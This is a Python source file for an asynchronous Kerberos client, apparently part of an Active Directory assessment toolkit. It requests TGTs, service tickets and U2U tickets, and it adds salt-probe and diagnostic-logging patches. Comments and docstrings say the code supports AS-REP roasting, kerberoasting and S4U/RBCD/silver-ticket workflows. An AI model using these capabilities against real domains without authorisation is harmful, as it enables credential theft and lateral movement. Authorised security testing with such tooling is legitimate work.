from __future__ import annotations
from unicrypto import hashlib
import collections
import datetime
import secrets
import os
import io
import asyncio
from typing import List

from kerbad import logger
from kerbad.common.ccache import CCACHE
from kerbad.common.spn import KerberosSPN
from kerbad.protocol.asn1_structs import METHOD_DATA, ETYPE_INFO, ETYPE_INFO2, \
	PADATA_TYPE, PA_PAC_REQUEST, PA_ENC_TS_ENC, EncryptedData, krb5_pvno, KDC_REQ_BODY, \
	AS_REQ, TGS_REP, KDCOptions, PrincipalName, EncASRepPart, EncTGSRepPart, PrincipalName, Realm, \
	Checksum, APOptions, Authenticator, Ticket, AP_REQ, TGS_REQ, CKSUMTYPE, \
	PA_FOR_USER_ENC, PA_PAC_OPTIONS, PA_PAC_OPTIONSTypes, EncTicketPart, \
	ChangePasswdDataMS, EncryptionKey, EncKrbPrivPart, HostAddress, KRB_PRIV,\
	AP_REP, KERB_KEY_LIST_REQ, S4UUserID, S4UUserIDOptions, PA_S4U_X509_USER,\
	TransitedEncoding, TicketFlags

from kerbad.protocol.rfc3244 import KRB5ChangePassword, KRB5CHPWReply, KRB5CHPWResultCode
from kerbad.protocol.errors import KerberosErrorCode, KerberosError
from kerbad.protocol.encryption import Key, _enctype_table, _HMACMD5, Enctype, _checksum_table
from kerbad.protocol.constants import PaDataType, EncryptionType, NAME_TYPE, MESSAGE_TYPE
from kerbad.protocol.structures import AuthenticatorChecksum
from kerbad.gssapi.gssapi import GSSAPIFlags
from kerbad.network.aioclientsocket import AIOKerberosClientSocket, AIOKerberosPWChangeClientSocket

from kerbad.common.creds import KerberosCredential
from kerbad.common.target import KerberosTarget
from kerbad.protocol.rfc4556 import PKAuthenticator, AuthPack, PA_PK_AS_REP, KDCDHKeyInfo, PA_PK_AS_REQ
from kerbad.gssapi.channelbindings import ChannelBindingsStruct
from kerbad.protocol.ticketutils import construct_apreq_from_tgs_tgt, \
	decrypt_enc_ticket_part, reencrypt_enc_ticket_part, set_enc_ticket_part_flag

from asn1crypto import cms
from asn1crypto import core

class AIOKerberosClient:
	def __init__(self, ccred:KerberosCredential, target:KerberosTarget):
		self.credential = ccred
		self.target = target
		self.ksoc = AIOKerberosClientSocket(self.target)
		self.ccache = CCACHE()
		if ccred is not None:
			self.ccache = CCACHE() if self.credential.ccache is None else self.credential.ccache
		
		self.pkinit_tkey = None
		self.kerberos_session_key = None
		self.kerberos_TGT = None
		self.kerberos_TGT_encpart = None
		self.kerberos_TGS = None
		self.kerberos_cipher = None
		self.kerberos_cipher_type = None
		self.kerberos_key = None
		self.server_salt = None
		self.server_supp_enc_methods = None
		self.clock_skew = None

	async def __aenter__(self):
		return self
		
	async def __aexit__(self, exc_type, exc, traceback):
		# there are no long-running resources to close
		return

	def _now(self):
		now = datetime.datetime.now(datetime.timezone.utc)
		if self.clock_skew is not None:
			logger.debug(f"Adjusting time with clock skew of {self.clock_skew}")
			return now + self.clock_skew
		return now

	def build_asreq_lts(self, supported_encryption_method, kdcopts:List[str] = ['forwardable','renewable','proxiable'], enctimestamp=None, newnow=None, no_preauth = False, kdc_req_body_extra = None, with_pac:bool = True) -> AS_REQ:
		logger.debug('Constructing TGT request with auth data')
		#now to create an AS_REQ with encrypted timestamp for authentication
		padatas = []
		
		if with_pac is True:
			pa_data_1 = {}
			pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
			pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
			padatas.append(pa_data_1)
		
		logger.debug('Selecting common encryption type: %s' % supported_encryption_method.name)
		now = self._now()
		if no_preauth is False:
			if enctimestamp is None:
				#creating timestamp asn1
				timestamp = PA_ENC_TS_ENC({'patimestamp': now.replace(microsecond=0), 'pausec': now.microsecond}).dump()
				self.kerberos_cipher = _enctype_table[supported_encryption_method.value]
				self.kerberos_cipher_type = supported_encryption_method.value
				self.kerberos_key = Key(self.kerberos_cipher.enctype, self.credential.get_key_for_enctype(supported_encryption_method, salt = self.server_salt))
				enc_timestamp = self.kerberos_cipher.encrypt(self.kerberos_key, 1, timestamp, None)
			else:
				now = newnow
				enc_timestamp = enctimestamp
			
			pa_data_2 = {}
			pa_data_2['padata-type'] = int(PADATA_TYPE('ENC-TIMESTAMP'))
			pa_data_2['padata-value'] = EncryptedData({'etype': supported_encryption_method.value, 'cipher': enc_timestamp}).dump()
			padatas.append(pa_data_2)

		kdc_req_body = {}
		kdc_req_body['kdc-options'] = KDCOptions(set(kdcopts))
		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': self.credential.username.split('/')})
		kdc_req_body['realm'] = self.credential.domain.upper()
		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
		kdc_req_body['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['nonce'] = secrets.randbits(31)
		kdc_req_body['etype'] = self.credential.get_supported_enctypes() #gives all client supported etypes in case server does not support the selected one
		
		if kdc_req_body_extra is not None:
			for key in kdc_req_body_extra:
				kdc_req_body[key] = kdc_req_body_extra[key]
		
		kdc_req = {}
		kdc_req['pvno'] = krb5_pvno
		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
		kdc_req['padata'] = padatas
		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
		
		return AS_REQ(kdc_req)
	
	def build_asreq_pkinit(self, supported_encryption_method, kdcopts = ['forwardable','renewable','renewable-ok'], with_pac:bool = True) -> AS_REQ:
		from asn1crypto import keys

		if supported_encryption_method.value == 23:
			raise Exception('RC4 encryption is not supported for certificate auth!')


		now = self._now()

		kdc_req_body_data = {}
		kdc_req_body_data['kdc-options'] = KDCOptions(set(kdcopts))
		kdc_req_body_data['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': self.credential.username.split('/')})
		kdc_req_body_data['realm'] = self.credential.domain.upper()
		kdc_req_body_data['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
		kdc_req_body_data['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body_data['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body_data['nonce'] = secrets.randbits(31)
		kdc_req_body_data['etype'] = self.credential.get_supported_enctypes() #gives all client supported etypes in case server does not support the selected one
		kdc_req_body = KDC_REQ_BODY(kdc_req_body_data)


		checksum = hashlib.sha1(kdc_req_body.dump()).digest()

		authenticator = {}
		authenticator['cusec'] = now.microsecond
		authenticator['ctime'] = now.replace(microsecond=0)
		authenticator['nonce'] = secrets.randbits(31)
		authenticator['paChecksum'] = checksum


		dp = {}
		dp['p'] = self.credential.dhparams.p
		dp['g'] = self.credential.dhparams.g
		dp['q'] = 0 # mandatory parameter, but it is not needed

		pka = {}
		pka['algorithm'] = '1.2.840.10046.2.1'
		pka['parameters'] = keys.DomainParameters(dp)

		spki = {}
		spki['algorithm'] = keys.PublicKeyAlgorithm(pka)
		spki['public_key'] = self.credential.dhparams.get_public_key()


		authpack = {}
		authpack['pkAuthenticator'] = PKAuthenticator(authenticator)
		authpack['clientPublicValue'] = keys.PublicKeyInfo(spki)
		authpack['clientDHNonce'] = self.credential.dhparams.dh_nonce

		authpack = AuthPack(authpack)
		signed_authpack = self.credential.sign_authpack(authpack.dump(), wrap_signed = True)

		payload = PA_PK_AS_REQ()
		payload['signedAuthPack'] = signed_authpack

		padatas = []
		if with_pac is True:
			pa_data_0 = {}
			pa_data_0['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
			pa_data_0['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
			padatas.append(pa_data_0)
		
		pa_data_1 = {}
		pa_data_1['padata-type'] = PaDataType.PK_AS_REQ.value
		pa_data_1['padata-value'] = payload.dump()
		padatas.append(pa_data_1)

		asreq = {}
		asreq['pvno'] = 5
		asreq['msg-type'] = 10
		asreq['padata'] = padatas
		asreq['req-body'] = kdc_req_body

		return AS_REQ(asreq)


	async def do_preauth(self, supported_encryption_method, kdcopts = ['forwardable','renewable','renewable-ok'], with_pac:bool = True):
		if self.credential.certificate is not None:
			req = self.build_asreq_pkinit(supported_encryption_method, kdcopts, with_pac=with_pac)
		else:
			req = self.build_asreq_lts(supported_encryption_method, kdcopts, with_pac=with_pac)
	
		logger.debug('Sending TGT request to server')
		rep = await self.ksoc.sendrecv(req.dump())
		if rep.name == 'KRB_ERROR':
			raise KerberosError(rep, 'Preauth failed!')
			
		return rep

	def tgt_from_ccache(self):
		try:
			if self.ccache is None:
				raise Exception('No CCACHE file found')
			
			tgt, keystruct, err = self.ccache.get_tgt(self.credential.username, self.credential.domain, self.credential.ccache_spn_strict_check)
			if err is not None:
				raise err
			self.kerberos_TGT = tgt
			self.kerberos_TGT_encpart = tgt['enc-part']
			self.kerberos_session_key = Key(keystruct['keytype'], keystruct['keyvalue'])
			self.kerberos_cipher = _enctype_table[keystruct['keytype']]
			self.kerberos_cipher_type = keystruct['keytype']
			return True, None
		except Exception as e:
			return None, e

	def select_preferred_encryption_method(self, rep):
		#now getting server's supported encryption methods
		
		self.server_supp_enc_methods = collections.OrderedDict()
		for enc_method in METHOD_DATA.load(rep['e-data']).native:
			data_type = PaDataType(enc_method['padata-type'])
			
			if data_type == PaDataType.ETYPE_INFO or data_type == PaDataType.ETYPE_INFO2:
				if data_type == PaDataType.ETYPE_INFO:
					enc_info_list = ETYPE_INFO.load(enc_method['padata-value'])
					
				elif data_type == PaDataType.ETYPE_INFO2:
					enc_info_list = ETYPE_INFO2.load(enc_method['padata-value'])
		
				for enc_info in enc_info_list.native:
					self.server_supp_enc_methods[EncryptionType(enc_info['etype'])] = enc_info['salt']
					logger.debug('Server supports encryption type %s with salt %s' % (EncryptionType(enc_info['etype']).name, enc_info['salt']))
		
		common_enctypes = self.credential.get_common_enctypes(self.server_supp_enc_methods)
		preferred_enc_type = self.credential.get_preferred_enctype(self.server_supp_enc_methods)
		if preferred_enc_type not in self.server_supp_enc_methods:
			raise Exception('Preferred enc type not in supported enctypes')
		salt = self.server_supp_enc_methods[preferred_enc_type]
		if salt is not None:
			salt = salt.encode()
		self.server_salt = salt #enc_info['salt'].encode()
		return preferred_enc_type, common_enctypes


	async def get_TGT(self, override_etype = None, decrypt_tgt = True, kdcopts = ['forwardable','renewable','proxiable'], override_sname:KerberosSPN = None, with_pac:bool = True):
		"""
		decrypt_tgt: used for asreproast attacks
		Steps performed:
			1. Send encrypted timestamp or empty (if no pre-auth selected) AS_REQ with all the encryption types we support
			2. Depending on the response (either error or AS_REP with TGT) returns the TGT (or fail miserably)
			3. PROFIT
		"""

		#first, let's check if CCACHE has the correct ticket already
		_, err = self.tgt_from_ccache()
		if err is None:
			return
		
		if override_etype is None:
			supported_etypes = self.credential.get_supported_enctypes()
		else:
			if isinstance(override_etype, list) is False:
				override_etype = [override_etype]
			supported_etypes = override_etype

		# ADscan diagnostic (instrumentation-only): record the etype list actually
		# sent to the KDC so an intermittent KDC_ERR_ETYPE_NOTSUPP (first mint OK,
		# later mints fail with the SAME user/salt/KDC) is diagnosable. Bracket-free
		# marker (Rich drops bracketed prefixes). No secret material is logged.
		try:
			logger.debug(
				'kdc-etype-mint: override=%s requested_etypes=%s nopreauth=%s cert=%s server_salt_preseeded=%s' % (
					override_etype is not None,
					[EncryptionType(et).name for et in supported_etypes],
					self.credential.nopreauth,
					self.credential.certificate is not None,
					self.server_salt is not None,
				)
			)
		except Exception:
			pass

		if self.credential.nopreauth:
			logger.debug('Generating initial TGT without authentication data')
			now = self._now()
			kdc_req_body = {}
			kdc_req_body['kdc-options'] = KDCOptions(set(kdcopts))
			kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': self.credential.username.split('/')})
			kdc_req_body['realm'] = self.credential.domain.upper()
			if override_sname is None:
				kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', self.credential.domain.upper()]})
			else:
				# if we want to directly kerberoast with no-preauth user
				kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': override_sname.get_principalname()})
			kdc_req_body['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
			kdc_req_body['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
			kdc_req_body['nonce'] = secrets.randbits(31)
			kdc_req_body['etype'] = supported_etypes

			pa_data_1 = {}
			if with_pac is True:
				pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
				pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
			
			kdc_req = {}
			kdc_req['pvno'] = krb5_pvno
			kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
			if len(pa_data_1) > 0:
				kdc_req['padata'] = [pa_data_1]
			kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
			
			req = AS_REQ(kdc_req)	
			
			logger.debug('Sending initial TGT to %s' % self.ksoc.get_addr_str())
			rep = await self.ksoc.sendrecv(req.dump())				
			if rep.name == 'KRB_ERROR':
				raise KerberosError(rep)
			#user can do kerberos auth without preauthentication!
			rep = rep.native
			self.kerberos_TGT = rep
			#if we want to roast the asrep (tgt rep) part then we dont even have the proper keys to decrypt
			#so we just return, the asrep can be extracted from this object anyhow
			return rep

		# --- ADscan vendor fix: ETYPE-INFO2 salt probe (non-default-salt KDCs) ---
		# On a KDC with a NON-DEFAULT Kerberos salt (e.g. PING.HTBC.Roberts), the
		# AES PA-ENC-TIMESTAMP key MUST be derived with the salt the KDC advertises
		# in ETYPE-INFO2. Without probing, build_asreq_lts derives the AES key with
		# the DEFAULT salt (domain.upper()+username) and the KDC rejects preauth with
		# KDC_ERR_PREAUTH_FAILED. We send ONE unauthenticated AS-REQ first to elicit
		# KDC_ERR_PREAUTH_REQUIRED + ETYPE-INFO2 and populate self.server_salt so the
		# authenticated loop below derives the correct key. This fixes EVERY consumer
		# (SMB/MSSQL/WinRM/RDP/LDAP/coercion/ADCS) at the vendor layer at once.
		#
		# Gate strictly so ccache-reuse (handled above), asreproast (nopreauth,
		# handled above), PKINIT (certificate), and pre-seeded-salt callers are
		# untouched:
		#   - server_salt is None        -> a caller has not already pre-seeded it
		#   - password is not None       -> AES key derivation uses a salt only for
		#                                   password creds (hash/aes-key/ccache do not)
		#   - certificate is None        -> PKINIT is salt-independent (build_asreq_pkinit)
		#   - not nopreauth              -> asreproast path returns before this block
		# Best-effort: any probe failure (timeout, unexpected reply) silently falls
		# through to the authenticated loop, which surfaces the real error. On a
		# default-salt KDC the probe runs but the advertised salt equals the default,
		# so it is a transparent no-op.
		if (
			self.server_salt is None
			and self.credential.password is not None
			and self.credential.certificate is None
			and not self.credential.nopreauth
		):
			try:
				# Probe with AES256 (etype 18): AES-only KDCs advertise the AES salt
				# in ETYPE-INFO2; RC4 entries typically carry salt=None. Probing with
				# RC4 would make select_preferred_encryption_method pick RC4 and leave
				# server_salt=None, re-introducing KDC_ERR_PREAUTH_FAILED on AES auth.
				probe_etype = EncryptionType.AES256_CTS_HMAC_SHA1_96
				probe_req = self.build_asreq_lts(probe_etype, no_preauth=True)
				logger.debug('Sending ETYPE-INFO2 salt probe (unauthenticated AS-REQ)')
				probe_rep = await self.ksoc.sendrecv(probe_req.dump())
				if probe_rep.name == 'KRB_ERROR':
					probe_err = KerberosError(probe_rep, 'etype-info2 salt probe')
					if (
						probe_err.errorcode == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED
						and probe_err.krb_err_msg.get('e-data')
					):
						self.select_preferred_encryption_method(probe_err.krb_err_msg)
						# select_preferred_encryption_method sets server_salt from the
						# credential's PREFERRED etype, which can be RC4 with salt=None
						# even when the KDC also advertised an AES salt. Fall back to the
						# AES256 then AES128 entry so password creds whose preferred etype
						# is RC4 still get the correct AES salt.
						if self.server_salt is None:
							supp = self.server_supp_enc_methods or {}
							for aes_et in (
								EncryptionType.AES256_CTS_HMAC_SHA1_96,
								EncryptionType.AES128_CTS_HMAC_SHA1_96,
							):
								aes_salt = supp.get(aes_et)
								if aes_salt is not None:
									self.server_salt = (
										aes_salt.encode()
										if isinstance(aes_salt, str)
										else aes_salt
									)
									break
						# ADscan diagnostic: record what ETYPE-INFO2 advertised so an
						# intermittent salt/supp-enc mismatch is diagnosable. Salt and
						# supported-etype names are NOT secrets; key material is never logged.
						try:
							supp_names = [
								EncryptionType(et).name for et in (self.server_supp_enc_methods or {}).keys()
							]
						except Exception:
							supp_names = None
						logger.debug(
							'kdc-etype-salt-probe: server_salt=%s supp_enc_methods=%s supp_populated=%s' % (
								self.server_salt,
								supp_names,
								bool(self.server_supp_enc_methods),
							)
						)
			except Exception as probe_exc:
				# Non-fatal: fall through to the authenticated loop, which surfaces
				# the real error. The probe must never convert a working flow into
				# a failure.
				logger.debug('ETYPE-INFO2 salt probe failed (non-fatal): %s' % (probe_exc,))
		# --- end ADscan vendor fix ---

		logger.debug('Generating initial TGT with authentication data')
		preauth_rep = None
		# Try every supported encryption type until one works
		for etype_int in supported_etypes:
			etype = EncryptionType(etype_int)
			# ADscan diagnostic: attempt number + etype tried in the authenticated
			# loop, with the resolved salt/supp-enc state. Makes a first-success-
			# then-fail pattern visible per mint. Bracket-free; no secrets.
			try:
				_attempt_idx = supported_etypes.index(etype_int)
				logger.debug(
					'kdc-etype-attempt: attempt=%d/%d etype=%s server_salt_set=%s supp_populated=%s' % (
						_attempt_idx + 1,
						len(supported_etypes),
						etype.name,
						self.server_salt is not None,
						bool(self.server_supp_enc_methods),
					)
				)
			except Exception:
				pass
			try:
				preauth_rep = await self.do_preauth(etype, with_pac=with_pac)
				break
			except KerberosError as e:
				if e.errorcode != KerberosErrorCode.KDC_ERR_ETYPE_NOTSUPP:
					raise e
				logger.debug('Failed to get TGT with etype %s' % etype.name)
				# ADscan diagnostic: the KDC rejected this etype. Record the rejected
				# etype + whether the KDC supplied e-data so an intermittent
				# KDC_ERR_ETYPE_NOTSUPP is diagnosable. The advertised supported etypes
				# are logged below, AFTER the existing (single) select_preferred call
				# parses them — this branch must NOT call it (extra call = side effects).
				try:
					logger.debug(
						'kdc-etype-notsupp: rejected_etype=%s has_edata=%s server_salt=%s' % (
							etype.name,
							bool(e.krb_err_msg.get('e-data')),
							self.server_salt,
						)
					)
				except Exception:
					pass
				# If the server suggested encryption methods, we will use them
				if e.krb_err_msg.get('e-data'):
					srv_etype,default_supported_etypes = self.select_preferred_encryption_method(e.krb_err_msg)
					# ADscan diagnostic: the KDC-advertised supported etypes + the
					# server-preferred etype it suggested for the retry (parsed by the
					# call above — no extra call). Names are not secrets.
					try:
						_supp_names = [
							EncryptionType(et).name for et in (self.server_supp_enc_methods or {}).keys()
						]
						logger.debug(
							'kdc-etype-suggested: srv_preferred=%s kdc_supp_etypes=%s server_salt=%s' % (
								srv_etype.name,
								_supp_names,
								self.server_salt,
							)
						)
					except Exception:
						pass
					# ADscan vendor fix: respect an explicit caller etype restriction.
					# When get_TGT was called with override_etype, the server-suggested
					# retry MUST stay within that list. select_preferred_encryption_method
					# derives srv_etype from the credential's FULL supported set (it ignores
					# the per-call override_etype), so without this guard an RC4-only request
					# (e.g. the posture RC4 probe, override_etype=[23]) silently retries with
					# the server's AES and falsely succeeds — making the probe report RC4 as
					# accepted on an AES-only KDC. When no override was given, follow the
					# server as before.
					if override_etype is not None and srv_etype.value not in supported_etypes:
						if etype_int == supported_etypes[-1]:
							raise e
						continue
					logger.debug('Trying with supported suggested etype %s' % srv_etype.name)
					preauth_rep = await self.do_preauth(srv_etype, with_pac=with_pac)
					break
				if etype_int == supported_etypes[-1]:
					raise e
		
		logger.debug('Got valid TGT response from server')
		rep = preauth_rep.native
		self.kerberos_TGT = rep

		if decrypt_tgt is False:
			return rep
		
		if self.credential.certificate is not None:
			self.kerberos_TGT_encpart, self.kerberos_session_key, self.kerberos_cipher = self.decrypt_asrep_cert(rep)
			self.kerberos_cipher_type = rep['enc-part']['etype']

			self.ccache.add_tgt(self.kerberos_TGT, self.kerberos_TGT_encpart, override_pp = True)
			logger.debug('Got valid TGT')
			return 
		
		else:
			cipherText = rep['enc-part']['cipher']
			temp = self.kerberos_cipher.decrypt(self.kerberos_key, 3, cipherText)
			try:
				self.kerberos_TGT_encpart = EncASRepPart.load(temp).native
			except Exception as e:
				logger.debug('EncAsRepPart load failed, is this linux?')
				try:
					self.kerberos_TGT_encpart = EncTGSRepPart.load(temp).native
				except Exception as e:
					logger.error('Failed to load decrypted part of the reply!')
					raise e
			self.kerberos_cipher = _enctype_table[self.kerberos_TGT_encpart['key']['keytype']]
			self.kerberos_cipher_type = self.kerberos_TGT_encpart['key']['keytype']
			self.kerberos_session_key = Key(self.kerberos_cipher.enctype, self.kerberos_TGT_encpart['key']['keyvalue'])
			self.ccache.add_tgt(self.kerberos_TGT, self.kerberos_TGT_encpart, override_pp = True)
			logger.debug('Got valid TGT')
			
			return 

	def tgs_from_ccache(self, spn_user:KerberosSPN):
		try:
			if self.ccache is None:
				raise Exception('No CCACHE file found')
			
			tgs, keystruct, err = self.ccache.get_tgs(spn_user)
			if err is not None:
				raise err
			
			
			key = Key(keystruct['keytype'], keystruct['keyvalue'])
			# we must add the key back to the tgs
			keydata = EncryptionKey({'keytype': keystruct['keytype'], 'keyvalue': keystruct['keyvalue']}).dump()
			tgs['enc-part'] = EncryptedData({'etype': 0, 'cipher': keydata})
			tgs = TGS_REP(tgs).native
			return tgs, tgs['enc-part'], key, None			
		except Exception as e:
			return None, None, None, e

	async def get_TGS(self, spn_user:KerberosSPN, override_etype = None, is_linux = False, flags = ['forwardable','renewable','renewable_ok', 'canonicalize'], force_fresh_tgs = False):
		"""
		Requests a TGS ticket for the specified user.
		Returns the TGS ticket, end the decrpyted encTGSRepPart.

		spn_user: KerberosTarget: the service user you want to get TGS for.
		override_etype: None or list of etype values (int) Used mostly for kerberoasting, will override the AP_REQ supported etype values (which is derived from the TGT) to be able to recieve whatever tgs tiecket
		force_fresh_tgs: ADscan vendor fix — when True, skip the cached-TGS
			short-circuit below and ALWAYS contact the KDC for a fresh service
			ticket (the cached TGT is still loaded from the ccache to sign the
			TGS-REQ). Reusing a cached service ticket from a generic-TGT ccache
			produced AP-REQs the server rejected with KRB_ERR_GENERIC; the badauth
			fresh-TGS gate sets this so a fresh ticket is minted per SPN. Scoped
			ccaches (S4U/RBCD/silver — no TGT) never set it and keep their one
			cached service ticket (that IS the capability).
		"""

		#first, let's check if CCACHE has the correct ticket already
		if not force_fresh_tgs:
			tgs, encTGSRepPart, key, err = self.tgs_from_ccache(spn_user)
			if err is None:
				return tgs, encTGSRepPart, key


		if self.kerberos_TGT is None:
			#let's check if CCACHE has a TGT for us
			_, err = self.tgt_from_ccache()
			if err is not None:
				raise Exception('No TGT found in CCACHE!')

		#nope, we need to contact the server
		logger.debug('Constructing TGS request for user %s' % spn_user.get_formatted_pname())
		now = self._now()
		kdc_req_body = {}
		kdc_req_body['kdc-options'] = KDCOptions(set(flags))
		kdc_req_body['realm'] = self.kerberos_TGT['ticket']['sname']['name-string'][1]
		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': spn_user.get_principalname()})
		kdc_req_body['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['nonce'] = secrets.randbits(31)
		if override_etype:
			kdc_req_body['etype'] = override_etype
		else:
			if self.kerberos_cipher_type == -128:
				# we dunno how to do GSS api calls with -128 etype,
				# but we can request etype 23 here for which all is implemented
				kdc_req_body['etype'] = [23]
			else:
				kdc_req_body['etype'] = [self.kerberos_cipher_type, 23]

		authenticator_data = {}
		authenticator_data['authenticator-vno'] = krb5_pvno
		authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
		authenticator_data['cname'] = self.kerberos_TGT['cname']
		authenticator_data['cusec'] = now.microsecond
		authenticator_data['ctime'] = now.replace(microsecond=0)
		
		# RFC 4120 (3.3.2 / 7.5.1): the PA-TGS-REQ AP-REQ authenticator MUST carry
		# a keyed checksum (key usage 6) over the KDC-REQ-BODY, using the checksum
		# type that matches the TGT session-key enctype. Windows KDCs tolerate a
		# missing authenticator checksum, but RFC-strict KDCs (MIT, Heimdal, Samba
		# AD) reject it with KRB_AP_ERR_INAPP_CKSUM. Emit it unconditionally so we
		# work against every compliant KDC, not just Windows. The GSSAPI 0x8003
		# channel-binding checksum is NOT this checksum: it belongs in the AP-REQ
		# sent to the application server (construct_apreq), never in the TGS-REQ.
		from kerbad.protocol.encryption import make_checksum, Cksumtype
		_etype_to_authcksum = {
			Enctype.DES3: Cksumtype.SHA1_DES3,
			Enctype.AES128: Cksumtype.SHA1_AES128,
			Enctype.AES256: Cksumtype.SHA1_AES256,
			Enctype.RC4: Cksumtype.HMAC_MD5,
		}
		req_body_obj = KDC_REQ_BODY(kdc_req_body)
		_auth_cksumtype = _etype_to_authcksum.get(self.kerberos_cipher_type)
		if _auth_cksumtype is not None:
			authenticator_data['cksum'] = Checksum({
				'cksumtype': _auth_cksumtype,
				'checksum': make_checksum(_auth_cksumtype, self.kerberos_session_key, 6, req_body_obj.dump()),
			})

		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)
		
		ap_req = {}
		ap_req['pvno'] = krb5_pvno
		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
		ap_req['ap-options'] = APOptions(set())
		ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
		ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})
		
		pa_data_1 = {}
		pa_data_1['padata-type'] = PaDataType.TGS_REQ.value
		pa_data_1['padata-value'] = AP_REQ(ap_req).dump()
		
		
		kdc_req = {}
		kdc_req['pvno'] = krb5_pvno
		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
		kdc_req['padata'] = [pa_data_1]
		kdc_req['req-body'] = req_body_obj
		
		req = TGS_REQ(kdc_req)
		logger.debug('Constructing TGS request to server')
		rep = await self.ksoc.sendrecv(req.dump())
		if rep.name == 'KRB_ERROR':
			raise KerberosError(rep, 'get_TGS failed!')

		logger.debug('Got TGS reply, decrypting...')
		tgs = rep.native
		
		encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
		key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
		
		self.ccache.add_tgs(tgs, encTGSRepPart)
		logger.debug('Got valid TGS reply')
		self.kerberos_TGS = tgs
		return tgs, encTGSRepPart, key

	async def U2U(self, kdcopts = ['forwardable','renewable','canonicalize', 'enc-tkt-in-skey'], supp_enc_methods = [EncryptionType.DES_CBC_CRC,EncryptionType.DES_CBC_MD4,EncryptionType.DES_CBC_MD5,EncryptionType.DES3_CBC_SHA1,EncryptionType.ARCFOUR_HMAC_MD5,EncryptionType.AES256_CTS_HMAC_SHA1_96,EncryptionType.AES128_CTS_HMAC_SHA1_96]):
		if not self.kerberos_TGT:
			logger.debug('[U2U] TGT is not available! Fetching TGT...')
			await self.get_TGT()

		supp_enc = self.credential.get_preferred_enctype(supp_enc_methods)
		now = self._now()
		authenticator_data = {}
		authenticator_data['authenticator-vno'] = krb5_pvno
		authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
		authenticator_data['cname'] = self.kerberos_TGT['cname']
		authenticator_data['cusec'] = now.microsecond
		authenticator_data['ctime'] = now.replace(microsecond=0)


		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)

		ap_req = {}
		ap_req['pvno'] = krb5_pvno
		ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
		ap_req['ap-options'] = APOptions(set())
		ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
		ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})

		pa_data_auth = {}
		pa_data_auth['padata-type'] = PaDataType.TGS_REQ.value
		pa_data_auth['padata-value'] = AP_REQ(ap_req).dump()

		
		krb_tgs_body = {}
		krb_tgs_body['kdc-options'] = KDCOptions(set(kdcopts))
		krb_tgs_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': self.credential.username.split('/')})
		krb_tgs_body['realm'] = self.credential.domain.upper()
		krb_tgs_body['till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		krb_tgs_body['nonce'] = secrets.randbits(31)
		krb_tgs_body['etype'] = [23] # dunno why it must be 23?
		krb_tgs_body['additional-tickets'] = [Ticket(self.kerberos_TGT['ticket'])]
		
		
		krb_tgs_req = {}
		krb_tgs_req['pvno'] = krb5_pvno
		krb_tgs_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
		krb_tgs_req['padata'] = [pa_data_auth] #pa_for_user
		krb_tgs_req['req-body'] = KDC_REQ_BODY(krb_tgs_body)
		
		
		
		req = TGS_REQ(krb_tgs_req)
		logger.debug('[U2U] Sending request to server')
		
		reply = await self.ksoc.sendrecv(req.dump())
		if reply.name == 'KRB_ERROR':
			emsg = '[U2U] failed!'
			if reply.native['error-code'] == 16:
				emsg = '[U2U] Failed to get U2U! Error code (16) indicates that delegation is not enabled for this account!'			
			raise KerberosError(reply, emsg)
		
		logger.debug('[U2U] Got reply, decrypting...')
